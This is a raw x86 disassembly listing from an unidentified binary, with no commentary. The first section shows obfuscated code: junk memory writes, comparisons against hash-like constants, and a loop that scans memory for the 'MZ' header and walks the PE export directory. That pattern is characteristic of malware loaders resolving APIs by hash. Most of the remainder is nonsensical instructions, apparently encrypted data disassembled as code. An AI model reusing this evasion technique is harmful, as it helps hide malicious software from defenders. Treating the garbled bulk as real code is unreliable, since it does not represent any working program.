  41e09d:	stos   BYTE PTR es:[edi],al
  41e09e:	dec    ebx
  41e09f:	rcr    ebx,cl
  41e0a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0a2:	enter  0xd5a1,0xc6
  41e0a6:	rcr    BYTE PTR [edi-0x6e],cl
  41e0a9:	add    edx,DWORD PTR [eax]
  41e0ab:	sbb    edi,DWORD PTR [edi+0x761aedc4]
  41e0b1:	rcl    DWORD PTR [eax],cl
  41e0b3:	dec    eax
  41e0b4:	fild   WORD PTR [edi-0x3b]
  41e0b7:	(bad)  
  41e0b8:	dec    ebp
  41e0b9:	mov    edi,0x941f913d
  41e0be:	jo     0x41e087
  41e0c0:	add    eax,0x428e3f
  41e0c5:	push   esp
  41e0c6:	adc    eax,DWORD PTR [eax]
  41e0c8:	add    BYTE PTR [edi],cl
  41e0ca:	test   DWORD PTR [ecx],esi
  41e0cc:	add    BYTE PTR [eax],al
  41e0ce:	add    BYTE PTR [ebx],bh
  41e0d0:	xrelease mov DWORD PTR ds:0x428e7b,0x261b
  41e0db:	jne    0x41e100
  41e0e1:	push   ebx
  41e0e2:	mov    DWORD PTR ds:0x428e67,0x2b68
  41e0ec:	push   0x70941f97
  41e0f1:	mov    DWORD PTR ds:0x428e63,0x40d9
  41e0fb:	jmp    0x420786
  41e100:	mov    eax,ds:0x428eb7
  41e105:	mov    eax,DWORD PTR [ebp+0x18]
  41e108:	mov    esi,DWORD PTR [ebp+0x1c]
  41e10b:	cmp    eax,0x70941f97
  41e110:	mov    DWORD PTR ds:0x428ebb,0x3db6
  41e11a:	jne    0x41e147
  41e120:	cmp    esi,ebx
  41e122:	mov    DWORD PTR ds:0x428e5f,0x2bd8
  41e12c:	jne    0x41e147
  41e132:	push   ebx
  41e133:	mov    DWORD PTR ds:0x428e2b,0x15b3
  41e13d:	push   0x70941f95
  41e142:	jmp    0x420786
  41e147:	mov    DWORD PTR ds:0x428e73,0x7017
  41e151:	mov    eax,DWORD PTR [ebp+0x18]
  41e154:	mov    esi,DWORD PTR [ebp+0x1c]
  41e157:	mov    DWORD PTR ds:0x428e27,0x78f9
  41e161:	cmp    eax,0x70941f95
  41e166:	jne    0x41e19d
  41e16c:	mov    DWORD PTR ds:0x428ecf,0x6494
  41e176:	cmp    esi,ebx
  41e178:	jne    0x41e19d
  41e17e:	push   ebx
  41e17f:	mov    DWORD PTR ds:0x428ea3,0x58e0
  41e189:	push   0x70941f9b
  41e18e:	mov    DWORD PTR ds:0x428e3f,0x40d6
  41e198:	jmp    0x420786
  41e19d:	mov    DWORD PTR ds:0x428e93,edx
  41e1a3:	mov    eax,DWORD PTR [ebp+0x18]
  41e1a6:	mov    esi,DWORD PTR [ebp+0x1c]
  41e1a9:	mov    DWORD PTR ds:0x428e83,0x6338
  41e1b3:	cmp    eax,0x70941f9b
  41e1b8:	mov    DWORD PTR ds:0x428e53,0x174c
  41e1c2:	jne    0x41e203
  41e1c8:	mov    DWORD PTR ds:0x428e67,0x61b3
  41e1d2:	cmp    esi,ebx
  41e1d4:	mov    DWORD PTR ds:0x428e4b,0x6bb8
  41e1de:	jne    0x41e203
  41e1e4:	mov    DWORD PTR ds:0x428e2b,0x777c
  41e1ee:	push   ebx
  41e1ef:	push   0x70941f99
  41e1f4:	mov    DWORD PTR ds:0x428eb7,0x6b5e
  41e1fe:	jmp    0x420786
  41e203:	mov    eax,DWORD PTR [ebp+0x18]
  41e206:	not    edi
  41e208:	mov    esi,DWORD PTR [ebp+0x1c]
  41e20b:	mov    edi,0x70941f9d
  41e210:	cmp    eax,edi
  41e212:	jne    0x420747
  41e218:	cmp    esi,ebx
  41e21a:	jne    0x420747
  41e220:	mov    eax,DWORD PTR [ebp+0x10]
  41e223:	xor    eax,ecx
  41e225:	add    eax,edx
  41e227:	mov    DWORD PTR [ebp-0x20],eax
  41e22a:	mov    eax,DWORD PTR [ebp+0xc]
  41e22d:	mov    esi,DWORD PTR [ebp-0x8]
  41e230:	xor    eax,ecx
  41e232:	add    eax,edx
  41e234:	imul   eax,DWORD PTR [esi]
  41e237:	mov    esi,DWORD PTR [ebp+0x8]
  41e23a:	xor    esi,ecx
  41e23c:	add    esi,edx
  41e23e:	cmp    esi,eax
  41e240:	mov    eax,DWORD PTR [ebp-0x4]
  41e243:	mov    edi,0xffcd8d0a
  41e248:	je     0x41e267
  41e24e:	mov    esi,DWORD PTR [ebp-0x20]
  41e251:	add    DWORD PTR [eax],esi
  41e253:	mov    eax,DWORD PTR [ebp-0x4]
  41e256:	mov    esi,DWORD PTR [ebp+0xc]
  41e259:	xor    esi,ecx
  41e25b:	add    esi,edx
  41e25d:	imul   esi,DWORD PTR [eax]
  41e260:	mov    DWORD PTR [eax],esi
  41e262:	jmp    0x41e26c
  41e267:	mov    esi,DWORD PTR [ebp+0x14]
  41e26a:	xor    DWORD PTR [eax],esi
  41e26c:	mov    eax,DWORD PTR [ebp-0x4]
  41e26f:	mov    esi,DWORD PTR [ebp+0x10]
  41e272:	xor    esi,ecx
  41e274:	sub    edi,esi
  41e276:	add    DWORD PTR [eax],edi
  41e278:	mov    eax,DWORD PTR [ebp-0x4]
  41e27b:	mov    esi,DWORD PTR [ebp-0x8]
  41e27e:	add    esi,DWORD PTR [eax]
  41e280:	mov    DWORD PTR [ebp-0x8],esi
  41e283:	mov    eax,DWORD PTR [ebp+0xc]
  41e286:	mov    esi,DWORD PTR [ebp+0xc]
  41e289:	xor    esi,ecx
  41e28b:	xor    eax,ecx
  41e28d:	lea    eax,[eax+esi*1+0x64e5ec]
  41e294:	mov    esi,DWORD PTR [ebp+0xc]
  41e297:	xor    esi,ecx
  41e299:	add    esi,edx
  41e29b:	imul   eax,esi
  41e29e:	mov    esi,DWORD PTR [ebp+0xc]
  41e2a1:	xor    esi,ecx
  41e2a3:	sub    esi,eax
  41e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e2a8:	add    esi,edx
  41e2aa:	cmp    DWORD PTR [eax],esi
  41e2ac:	mov    eax,DWORD PTR [ebp-0x4]
  41e2af:	mov    esi,DWORD PTR [ebp+0x10]
  41e2b2:	jg     0x41e2c8
  41e2b8:	xor    esi,ecx
  41e2ba:	mov    edi,0xffcd8d0a
  41e2bf:	sub    edi,esi
  41e2c1:	add    DWORD PTR [eax],edi
  41e2c3:	jmp    0x41e2ce
  41e2c8:	xor    esi,ecx
  41e2ca:	add    esi,edx
  41e2cc:	add    DWORD PTR [eax],esi
  41e2ce:	mov    eax,DWORD PTR [ebp-0x8]
  41e2d1:	mov    esi,DWORD PTR [ebp-0x10]
  41e2d4:	mov    eax,DWORD PTR [eax]
  41e2d6:	xor    esi,ecx
  41e2d8:	add    esi,0x3272f5
  41e2de:	mov    DWORD PTR [ebp-0x28],0x7097b85c
  41e2e5:	mov    DWORD PTR [ebp-0x24],ebx
  41e2e8:	not    esi
  41e2ea:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  41e2f1:	mov    DWORD PTR [ebp-0x2c],ebx
  41e2f4:	mov    ebx,DWORD PTR [ebp-0x28]
  41e2f7:	mov    edi,DWORD PTR [ebp-0x24]
  41e2fa:	and    eax,esi
  41e2fc:	mov    esi,0xa143
  41e301:	xor    bx,si
  41e304:	mov    esi,0x412e
  41e309:	add    bx,si
  41e30c:	cmp    WORD PTR [eax],bx
  41e30f:	je     0x41e359
  41e315:	mov    edi,DWORD PTR [ebp-0x10]
  41e318:	xor    edi,ecx
  41e31a:	mov    DWORD PTR [ebp-0x28],0x7097b85c
  41e321:	mov    DWORD PTR [ebp-0x24],0xffffffff
  41e328:	mov    ebx,0xffcd8d0a
  41e32d:	sub    ebx,edi
  41e32f:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  41e336:	add    eax,ebx
  41e338:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  41e33f:	mov    edi,DWORD PTR [ebp-0x28]
  41e342:	mov    ebx,DWORD PTR [ebp-0x24]
  41e345:	mov    ebx,0xa143
  41e34a:	xor    di,bx
  41e34d:	add    di,si
  41e350:	cmp    WORD PTR [eax],di
  41e353:	jne    0x41e315
  41e359:	mov    edi,DWORD PTR [ebp-0x14]
  41e35c:	mov    edi,DWORD PTR [edi]
  41e35e:	mov    ebx,DWORD PTR [eax+0x3c]
  41e361:	lea    edi,[ebx+edi*8+0x78]
  41e365:	mov    edi,DWORD PTR [edi+eax*1]
  41e368:	mov    DWORD PTR [ebp-0x18],edi
  41e36b:	mov    edi,DWORD PTR [ebp+0x8]
  41e36e:	xor    edi,ecx
  41e370:	add    edi,edx
  41e372:	jmp    0x4206eb
  41e377:	push   esi
  41e378:	inc    eax
  41e379:	dec    ebp
  41e37a:	test   DWORD PTR ds:0xe2b09684,eax
  41e380:	(bad)  [ebx]
  41e382:	data16 and dl,BYTE PTR cs:[edx]
  41e386:	fs retf 
  41e388:	fiadd  DWORD PTR [edx-0x7c9fd87d]
  41e38e:	cmp    DWORD PTR [eax],0xffffffe6
  41e391:	push   edi
  41e392:	push   0xf
  41e394:	push   es
  41e395:	sbb    ecx,ebp
  41e397:	xor    ebp,eax
  41e399:	or     bl,BYTE PTR [esi+ecx*8-0x22ee3204]
  41e3a0:	pop    esp
  41e3a1:	fwait
  41e3a2:	enter  0xe812,0xa0
  41e3a6:	pop    ebx
  41e3a7:	lock mov WORD PTR [edi-0x7547bd0a],ds
  41e3ae:	pop    ds
  41e3af:	ins    DWORD PTR es:[edi],dx
  41e3b0:	aam    0xa1
  41e3b2:	fldcw  WORD PTR [edi]
  41e3b4:	add    ebx,DWORD PTR [ebp+0x7c2d08d4]
  41e3ba:	ret    
  41e3bb:	inc    ebx
  41e3bc:	cmp    al,0x48
  41e3be:	shl    edi,0x7f
  41e3c1:	leave  
  41e3c2:	(bad)  
  41e3c3:	(bad)
  41e3c6:	cld    
  41e3c7:	jb     0x41e3d5
  41e3c9:	idiv   BYTE PTR [ebp*8-0x861d151]
  41e3d0:	adc    eax,0xf19b15e1
  41e3d5:	lock xchg BYTE PTR [edi+ecx*1-0x75],bh
  41e3da:	(bad)  
  41e3db:	add    al,0x12
  41e3dd:	dec    ebp
  41e3de:	aaa    
  41e3df:	cmp    al,0x7a
  41e3e1:	idiv   DWORD PTR [eax-0x28]
  41e3e4:	xor    BYTE PTR [esi],dh
  41e3e6:	int    0x7b
  41e3e8:	(bad)  
  41e3e9:	pop    esp
  41e3ea:	or     BYTE PTR ds:[eax-0xd85cf98],bh
  41e3f1:	imul   DWORD PTR [eax+eax*4+0x72]
  41e3f5:	pop    ds
  41e3f6:	jo     0x41e44a
  41e3f8:	sub    bl,BYTE PTR [eax+0xe]
  41e3fb:	jns    0x41e40b
  41e3fd:	icebp  
  41e3fe:	xchg   ebp,eax
  41e3ff:	jmp    0x94804fa2
  41e404:	ret    0x3e82
  41e407:	sbb    BYTE PTR [ecx-0x76417e6b],ah
  41e40d:	cdq    
  41e40e:	call   0xc8163f06
  41e413:	fwait
  41e414:	sub    bh,al
  41e416:	fdivr  DWORD PTR [ebx+edx*1+0x6e55fb23]
  41e41d:	ficom  DWORD PTR [esi]
  41e41f:	mov    esi,0xf21be6ca
  41e424:	ins    BYTE PTR es:[edi],dx
  41e425:	fs add eax,0x2c784904
  41e42b:	nop
  41e42c:	repz les edi,FWORD PTR [edx]
  41e42f:	fstp   QWORD PTR [eax+edi*8+0x2ae4f6f5]
  41e436:	fdiv   QWORD PTR [ebp+0x1e78f7ba]
  41e43c:	xor    eax,0x22214ef3
  41e441:	jb     0x41e45d
  41e443:	cmp    bh,bl
  41e445:	lahf   
  41e446:	xchg   DWORD PTR [edi-0x46],ebx
  41e449:	fidiv  DWORD PTR [edx+eax*4+0x72]
  41e44d:	cmc    
  41e44e:	hlt    
  41e44f:	xchg   esi,eax
  41e450:	std    
  41e451:	push   ebp
  41e452:	jmp    0x11c979da
  41e457:	imul   ecx,DWORD PTR [eax+ebx*2],0xb94bd790
  41e45e:	jmp    0x41e3f5
  41e460:	jl     0x41e414
  41e462:	cmp    ecx,DWORD PTR [ebp-0x151e5b06]
  41e468:	mov    edx,0x8234d86d
  41e46d:	sbb    BYTE PTR [eax+0x7bbad7bb],bl
  41e473:	in     eax,dx
  41e474:	test   DWORD PTR [edx],0x13d042d1
  41e47a:	sub    bl,BYTE PTR [ebx-0x13]
  41e47d:	sbb    BYTE PTR [ecx-0x3a],dh
  41e480:	adc    al,0xce
  41e482:	pop    edx
  41e483:	xchg   esp,eax
  41e484:	arpl   WORD PTR [edx+0xd33e1d],bp
  41e48a:	add    DWORD PTR ds:0x9993f1c9,0xffffff90
  41e491:	call   0x7b88ee4d
  41e496:	mov    bl,0xfb
  41e498:	fsubr  st(3),st
  41e49a:	aaa    
  41e49b:	ins    DWORD PTR es:[edi],dx
  41e49c:	fxam   
  41e49e:	sbb    ah,bl
  41e4a0:	aam    0x9d
  41e4a2:	and    BYTE PTR [esi+0x3],dl
  41e4a5:	rol    DWORD PTR [eax],0xb6
  41e4a8:	sub    eax,0xd6eefc2d
  41e4ad:	xor    eax,0x6ad06fd
  41e4b2:	cdq    
  41e4b3:	test   DWORD PTR [edi-0x5c],ecx
  41e4b6:	sub    bl,BYTE PTR [ebx]
  41e4b8:	xor    edi,DWORD PTR [edx+0x5b]
  41e4bb:	adc    al,0x52
  41e4bd:	popa   
  41e4be:	xchg   DWORD PTR [eax-0x4c],edx
  41e4c1:	push   esp
  41e4c2:	mov    eax,ds:0x9b8b2a4e
  41e4c7:	jno    0x41e544
  41e4c9:	dec    eax
  41e4ca:	lock ds int 0x72
  41e4ce:	push   esp
  41e4cf:	inc    esp
  41e4d0:	aas    
  41e4d1:	loopne 0x41e511
  41e4d3:	adc    bl,bh
  41e4d5:	adc    esi,ecx
  41e4d7:	sub    edx,edx
  41e4d9:	or     ah,BYTE PTR [edi-0x5950b682]
  41e4df:	inc    dh
  41e4e1:	add    DWORD PTR [eax],edi
  41e4e3:	sbb    BYTE PTR [edx],ch
  41e4e5:	xchg   esi,eax
  41e4e6:	test   edi,edi
  41e4e8:	sbb    DWORD PTR [esi],esi
  41e4ea:	pop    esp
  41e4eb:	xor    DWORD PTR [ebx-0x7e],0x2e
  41e4ef:	inc    ebx
  41e4f0:	jge    0x41e518
  41e4f2:	mov    esi,0x6cadaec0
  41e4f7:	(bad)  
  41e4f8:	loopne 0x41e51f
  41e4fa:	cld    
  41e4fb:	add    dh,BYTE PTR [esi-0x6]
  41e4fe:	mov    edi,0x8e2c9324
  41e503:	xor    eax,DWORD PTR [edx-0x3ee12c38]
  41e509:	jmp    0x15cad8a2
  41e50e:	or     dh,BYTE PTR [ebp+0x7d93f22]
  41e514:	ins    DWORD PTR es:[edi],dx
  41e515:	add    ebp,ebp
  41e517:	xor    esi,eax
  41e519:	out    0xae,eax
  41e51b:	cli    
  41e51c:	jmp    0x41e54b
  41e51e:	shl    cl,0xb4
  41e521:	mov    bl,0x88
  41e523:	adc    edi,DWORD PTR [eax+0x40]
  41e526:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e527:	jno    0x41e512
  41e529:	adc    edi,edi
  41e52b:	call   0x141b:0x94326ea4
  41e532:	js     0x41e567
  41e534:	jb     0x41e4d0
  41e536:	xor    eax,0x1bc8ae94
  41e53b:	aam    0x39
  41e53d:	pop    ebp
  41e53e:	cmp    al,0x29
  41e540:	sub    al,0xb2
  41e542:	push   esp
  41e543:	sti    
  41e544:	fisubr WORD PTR fs:[ecx]
  41e547:	or     al,0x3e
  41e549:	out    dx,eax
  41e54a:	aam    0x72
  41e54c:	iret   
  41e54d:	aam    0x56
  41e54f:	add    eax,0x4eecf6a1
  41e554:	sbb    ebx,esp
  41e556:	add    al,0x65
  41e558:	sbb    BYTE PTR [eax],0xa5
  41e55b:	out    dx,eax
  41e55c:	jns    0x41e5b7
  41e55e:	push   ebp
  41e55f:	std    
  41e560:	pop    eax
  41e561:	ret    
  41e562:	mov    bh,ah
  41e564:	xor    BYTE PTR [ebp+esi*8-0x722bd08c],cl
  41e56b:	adc    edi,DWORD PTR [ebx-0x2e]
  41e56e:	inc    ecx
  41e56f:	push   cs
  41e570:	test   eax,0xe9c065c2
  41e575:	mov    esp,0x3897205d
  41e57a:	jo     0x41e586
  41e57c:	fld    QWORD PTR [esi+edi*2]
  41e57f:	retf   0x5642
  41e582:	adc    bh,BYTE PTR [ecx+0x7dbfb82b]
  41e588:	retf   
  41e589:	add    ecx,esp
  41e58b:	(bad)  
  41e58c:	and    DWORD PTR gs:[ebp+ecx*4-0x16],0xf961f339
  41e595:	dec    eax
  41e596:	retf   0xcd2f
  41e599:	ds pop ss
  41e59b:	mov    dh,ah
  41e59d:	mov    esi,0xbe2b320e
  41e5a2:	mov    dl,0xd6
  41e5a4:	push   cs
  41e5a5:	and    al,ch
  41e5a7:	dec    edi
  41e5a8:	pop    edi
  41e5a9:	xor    BYTE PTR [ecx+0x39],ah
  41e5ac:	out    0xa1,al
  41e5ae:	rdpmc  
  41e5b0:	shl    DWORD PTR [eax+0x49f69176],cl
  41e5b6:	xchg   edi,eax
  41e5b7:	inc    esp
  41e5b8:	xor    BYTE PTR [ebx-0x74],cl
  41e5bb:	ja     0x41e558
  41e5bd:	push   ebp
  41e5be:	push   0x4fc315f3
  41e5c3:	je     0x41e58a
  41e5c5:	loope  0x41e5bd
  41e5c7:	fcmovnu st,st(1)
  41e5c9:	jb     0x41e57d
  41e5cb:	mov    ecx,0xbc992bb4
  41e5d0:	lahf   
  41e5d1:	fs in  eax,0x5c
  41e5d4:	imul   esi,DWORD PTR [ecx+0x7c6f0807],0x42
  41e5db:	sbb    BYTE PTR [edx-0x37],ah
  41e5de:	or     ah,dh
  41e5e0:	adc    al,0xfd
  41e5e2:	push   ebx
  41e5e3:	sbb    al,0x33
  41e5e5:	xchg   esi,eax
  41e5e6:	xchg   edx,eax
  41e5e7:	rcr    BYTE PTR [ebx],0xa8
  41e5ea:	neg    DWORD PTR [ebx]
  41e5ec:	xlat   BYTE PTR ds:[ebx]
  41e5ed:	jp     0x41e602
  41e5ef:	mov    esp,0x95028f11
  41e5f4:	fstp   DWORD PTR [ecx]
  41e5f6:	sub    al,0x63
  41e5f8:	adc    BYTE PTR [eax+0x58],bh
  41e5fb:	dec    eax
  41e5fc:	pop    es
  41e5fd:	jb     0x41e5e1
  41e5ff:	jb     0x41e67c
  41e601:	call   0xbabd5196
  41e606:	imul   edi,DWORD PTR [ecx+0x362aeb78],0x231fe8eb
  41e610:	aam    0x7b
  41e612:	lods   eax,DWORD PTR ds:[esi]
  41e613:	pop    ds
  41e614:	push   edx
  41e615:	dec    ebx
  41e616:	push   ebp
  41e617:	inc    edx
  41e618:	outs   dx,DWORD PTR ds:[esi]
  41e619:	cmp    edx,ecx
  41e61b:	push   ss
  41e61c:	ret    
  41e61d:	or     eax,0x2d41af4b
  41e622:	int3   
  41e623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e624:	sahf   
  41e625:	jno    0x41e5e3
  41e627:	hlt    
  41e628:	xchg   esp,eax
  41e629:	sub    al,0x1c
  41e62b:	xchg   ebx,eax
  41e62c:	imul   DWORD PTR ds:0xafbc1bb6
  41e632:	mov    ?,WORD PTR [ebx]
  41e634:	hlt    
  41e635:	add    BYTE PTR [esi],0xfa
  41e638:	jl     0x41e6a4
  41e63a:	mov    ds:0x2340ac03,eax
  41e63f:	adc    esi,eax
  41e641:	fdivp  st(7),st
  41e643:	mov    ebp,DWORD PTR [esp+ebp*1]
  41e646:	rcr    DWORD PTR [ebx+0x2c],0xea
  41e64a:	retf   0xf352
  41e64d:	stos   DWORD PTR es:[edi],eax
  41e64e:	(bad)  
  41e64f:	cwde   
  41e650:	or     eax,0x9847d722
  41e655:	std    
  41e656:	sbb    al,0xf2
  41e658:	test   DWORD PTR [eax+0xa0c618a],0x251418b2
  41e662:	das    
  41e663:	dec    eax
  41e664:	push   esp
  41e665:	icebp  
  41e666:	push   edi
  41e667:	xchg   eax,esp
  41e669:	loope  0x41e674
  41e66b:	into   
  41e66c:	xchg   esp,eax
  41e66d:	mov    eax,ds:0x5957f1e6
  41e672:	xchg   ebx,eax
  41e673:	mov    edi,0xa43decce
  41e678:	loope  0x41e648
  41e67a:	iret   
  41e67b:	lea    ecx,[edx]
  41e67d:	outs   dx,DWORD PTR ds:[esi]
  41e67e:	cmp    BYTE PTR [ebx+0x19],al
  41e681:	shufps xmm3,XMMWORD PTR [eax-0x68d631ee],0x3
  41e689:	out    0xd3,al
  41e68b:	dec    ebp
  41e68c:	cmp    BYTE PTR [esi-0x65],0x6c
  41e690:	shl    DWORD PTR [edi],1
  41e692:	pusha  
  41e693:	push   edi
  41e694:	into   
  41e695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e696:	or     BYTE PTR [ecx-0x552543f1],ch
  41e69c:	clc    
  41e69d:	clc    
  41e69e:	xor    ch,BYTE PTR [ebx]
  41e6a0:	and    DWORD PTR [eax+0x1b],0x3ff30de5
  41e6a7:	clc    
  41e6a8:	je     0x41e636
  41e6aa:	xchg   ebx,eax
  41e6ab:	inc    edx
  41e6ac:	xor    DWORD PTR [ebx],esi
  41e6ae:	je     0x41e6f2
  41e6b0:	outs   dx,DWORD PTR ds:[esi]
  41e6b1:	ds scas al,BYTE PTR es:[edi]
  41e6b3:	or     bh,BYTE PTR [ebx+0x6b]
  41e6b6:	push   cs
  41e6b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6b8:	inc    esp
  41e6b9:	sub    BYTE PTR [edx+0x36c34613],0xc0
  41e6c0:	jb     0x41e6d0
  41e6c2:	fisttp QWORD PTR [ebx-0x77]
  41e6c5:	xor    eax,DWORD PTR [edi-0x5865d1f7]
  41e6cb:	mov    ebp,0x350e5f41
  41e6d0:	in     al,dx
  41e6d1:	imul   edi,DWORD PTR [ecx+0xd],0xfd7253aa
  41e6d8:	es xor eax,0x598ad1ff
  41e6de:	cmp    esp,ecx
  41e6e0:	ins    BYTE PTR es:[edi],dx
  41e6e1:	cmp    al,0x28
  41e6e3:	call   0x9742:0x3923bd00
  41e6ea:	jge    0x41e69e
  41e6ec:	mov    ch,0x53
  41e6ee:	mov    ds:0x433e4cd4,eax
  41e6f3:	inc    edi
  41e6f4:	cmp    BYTE PTR [esi+0x4a16e188],ah
  41e6fa:	sbb    al,0x68
  41e6fc:	(bad)  
  41e6fe:	lods   al,BYTE PTR ds:[esi]
  41e6ff:	jo     0x41e76b
  41e701:	hlt    
  41e702:	lea    eax,[esi*2+0x4666d2a9]
  41e709:	mov    al,ds:0xaf735782
  41e70e:	es call 0x8aa4:0x7ee00a44
  41e716:	sar    BYTE PTR [edx],cl
  41e718:	out    0xbb,al
  41e71a:	mov    esi,0x5909bc75
  41e71f:	sub    BYTE PTR [ebx-0x1205591f],0x69
  41e726:	add    DWORD PTR [edi],esi
  41e728:	sbb    al,bl
  41e72a:	fcmovnbe st,st(6)
  41e72c:	les    ebx,FWORD PTR [edi+0x46f2a7c9]
  41e732:	les    esi,FWORD PTR [ebx+ecx*4]
  41e735:	leave  
  41e736:	or     eax,0xfd8cbc58
  41e73b:	pop    es
  41e73c:	lods   eax,DWORD PTR ds:[esi]
  41e73d:	xor    eax,0xf4dd08fd
  41e742:	imul   esp,DWORD PTR [edx],0x1f63aeae
  41e748:	cmp    DWORD PTR [ebp-0x7f55c579],ebx
  41e74e:	mov    ds:0x5576d261,al
  41e753:	sar    BYTE PTR [ebx+0x20],1
  41e756:	and    dl,BYTE PTR [edi+0x574320ff]
  41e75c:	push   ss
  41e75d:	fst    QWORD PTR [esi+0x5]
  41e760:	data16 aam 0xa5
  41e763:	(bad)  
  41e765:	xchg   bl,dl
  41e767:	mov    ecx,0xc1f12463
  41e76d:	mov    al,BYTE PTR [eax]
  41e76f:	in     eax,dx
  41e770:	out    0x60,al
  41e772:	call   0xfe76:0x6d18bf21
  41e779:	and    BYTE PTR [edx-0x5e],dh
  41e77c:	pop    ecx
  41e77d:	ficom  WORD PTR [esi+0x2]
  41e780:	pusha  
  41e781:	inc    edi
  41e782:	retf   
  41e783:	and    DWORD PTR [edx+0x53],esp
  41e786:	repz out 0xa4,eax
  41e789:	(bad)  
  41e78a:	les    eax,FWORD PTR [ecx-0x46216f56]
  41e790:	sub    ch,BYTE PTR [ecx]
  41e792:	inc    eax
  41e793:	into   
  41e794:	mov    eax,0x6b147362
  41e799:	xchg   edi,eax
  41e79a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e79b:	jle    0x41e816
  41e79d:	mov    al,ds:0xdc68cba4
  41e7a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7a3:	stos   DWORD PTR es:[edi],eax
  41e7a4:	adc    eax,0x46d67e91
  41e7a9:	jns    0x41e73a
  41e7ab:	or     ecx,DWORD PTR [edi+edx*1-0x10f299e7]
  41e7b2:	jg     0x41e801
  41e7b4:	mov    bl,0x4e
  41e7b6:	aad    0x2b
  41e7b8:	cmp    DWORD PTR [ecx+0x43d38436],eax
  41e7be:	sar    BYTE PTR [ebx],0x51
  41e7c1:	mov    DWORD PTR [ebx+0x19],ebx
  41e7c4:	test   BYTE PTR [edx],bh
  41e7c6:	xlat   BYTE PTR ds:[ebx]
  41e7c7:	pop    ebx
  41e7c8:	out    dx,al
  41e7c9:	ret    0xcac4
  41e7cc:	jl     0x41e84c
  41e7ce:	sbb    al,BYTE PTR [edi-0x43ef6621]
  41e7d4:	in     eax,dx
  41e7d5:	outs   dx,DWORD PTR ds:[esi]
  41e7d6:	icebp  
  41e7d7:	sbb    bh,0x82
  41e7da:	xlat   BYTE PTR ds:[ebx]
  41e7db:	jns    0x41e7db
  41e7dd:	rcr    al,0xd8
  41e7e0:	aaa    
  41e7e1:	or     esi,DWORD PTR [edi+0x7f31f003]
  41e7e7:	adc    al,0xe0
  41e7e9:	sbb    al,0x32
  41e7eb:	mov    dl,0x3a
  41e7ed:	fwait
  41e7ee:	loop   0x41e7a8
  41e7f0:	ds out 0xaa,eax
  41e7f3:	push   esi
  41e7f4:	lods   al,BYTE PTR ds:[esi]
  41e7f5:	outs   dx,DWORD PTR ds:[esi]
  41e7f6:	mov    eax,0x16098d51
  41e7fb:	(bad)  [ebp-0x6d]
  41e7fe:	sbb    eax,0x3eac49f5
  41e803:	fimul  WORD PTR [edx-0x2afc4fc1]
  41e809:	je     0x41e861
  41e80b:	in     eax,0x4c
  41e80d:	femms  
  41e80f:	xchg   edx,eax
  41e810:	xor    BYTE PTR [eax+0x40d49743],bh
  41e816:	lods   eax,DWORD PTR ds:[esi]
  41e817:	inc    eax
  41e818:	ins    DWORD PTR es:[edi],dx
  41e819:	cli    
  41e81a:	jle    0x41e7b8
  41e81c:	popa   
  41e81d:	pop    es
  41e81e:	xor    dl,ch
  41e820:	adc    esi,DWORD PTR [edx-0x6b]
  41e823:	add    DWORD PTR ds:0x658e6d2d,0xb374cbf
  41e82d:	es cld 
  41e82f:	push   esp
  41e830:	fstp   TBYTE PTR [edx]
  41e832:	mov    al,ds:0xb8a0b51e
  41e837:	xchg   BYTE PTR [edx+0x55],dh
  41e83a:	test   edi,eax
  41e83c:	xor    al,0xe9
  41e83e:	cdq    
  41e83f:	daa    
  41e840:	xor    DWORD PTR [esi],ebx
  41e842:	xor    eax,0xcc8fcbd2
  41e847:	dec    ebp
  41e848:	or     edx,esi
  41e84a:	or     al,0xc7
  41e84c:	mov    al,0x2d
  41e84e:	int3   
  41e84f:	in     al,dx
  41e850:	outs   dx,BYTE PTR ds:[esi]
  41e851:	mov    eax,ss
  41e853:	fs in  eax,dx
  41e855:	add    al,0x40
  41e857:	mov    al,0xc6
  41e859:	scas   eax,DWORD PTR es:[edi]
  41e85a:	outs   dx,BYTE PTR ss:[esi]
  41e85c:	scas   eax,DWORD PTR es:[edi]
  41e85d:	gs popa 
  41e85f:	arpl   WORD PTR [esi+0x7c],si
  41e862:	and    eax,0x5f6bac67
  41e867:	js     0x41e81c
  41e869:	inc    esp
  41e86a:	pop    eax
  41e86b:	sbb    eax,0xc1b5868f
  41e870:	test   eax,0x8e53efc5
  41e875:	sub    dl,cl
  41e877:	sti    
  41e878:	aas    
  41e879:	call   0x6a03296e
  41e87e:	push   es
  41e87f:	lods   al,BYTE PTR ds:[esi]
  41e880:	loope  0x41e834
  41e882:	jmp    0x41e867
  41e884:	ficom  DWORD PTR [ebx+0x278e8ec5]
  41e88a:	ret    0x5ae6
  41e88d:	inc    ebp
  41e88e:	add    al,0x1e
  41e890:	pop    ecx
  41e891:	pop    esi
  41e892:	(bad)  
  41e893:	xchg   esp,eax
  41e894:	jb     0x41e8b4
  41e896:	mov    esi,0xd60df6a8
  41e89b:	cmp    WORD PTR [ecx+0x59],cx
  41e89f:	(bad)  
  41e8a0:	xor    eax,0xfff40823
  41e8a5:	xchg   edi,eax
  41e8a6:	and    edi,DWORD PTR gs:[edi-0x311842a]
  41e8ad:	adc    DWORD PTR [edi-0x5d7d3a74],edi
  41e8b3:	stos   DWORD PTR es:[edi],eax
  41e8b4:	pop    ds
  41e8b5:	idiv   BYTE PTR [esp+ebx*2-0x25]
  41e8b9:	(bad)  
  41e8bb:	imul   eax
  41e8bd:	clc    
  41e8be:	test   BYTE PTR [esi+0x3f2f4a29],dl
  41e8c4:	je     0x41e8fa
  41e8c6:	int    0xfb
  41e8c8:	retf   0xfd53
  41e8cb:	mov    dh,0x71
  41e8cd:	and    edx,DWORD PTR [eax-0xa0060ee]
  41e8d3:	dec    edx
  41e8d4:	or     ah,bh
  41e8d6:	jo     0x41e8cc
  41e8d8:	sbb    al,0xbc
  41e8da:	xchg   DWORD PTR [edx-0x2b],eax
  41e8dd:	mov    WORD PTR [edx],?
